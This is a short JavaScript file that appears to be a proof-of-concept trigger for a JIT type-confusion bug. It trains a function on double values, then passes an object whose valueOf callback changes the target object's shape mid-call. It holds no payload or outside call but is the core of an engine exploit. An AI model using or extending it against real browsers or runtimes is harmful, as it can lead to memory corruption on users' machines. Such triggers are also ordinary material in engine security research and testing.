var global_obj = { p1: 1.1 };

function vunlnerable_func(val) {
    global_obj.p1 = val;
}

for (let i = 0; i < 20000; ++i) {
    vunlnerable_func(2.2);
}

let trigger_obj = {
    valueOf: function() {
        global_obj.p2 = {};
        return 3.3;
    }
};

vunlnerable_func(trigger_obj);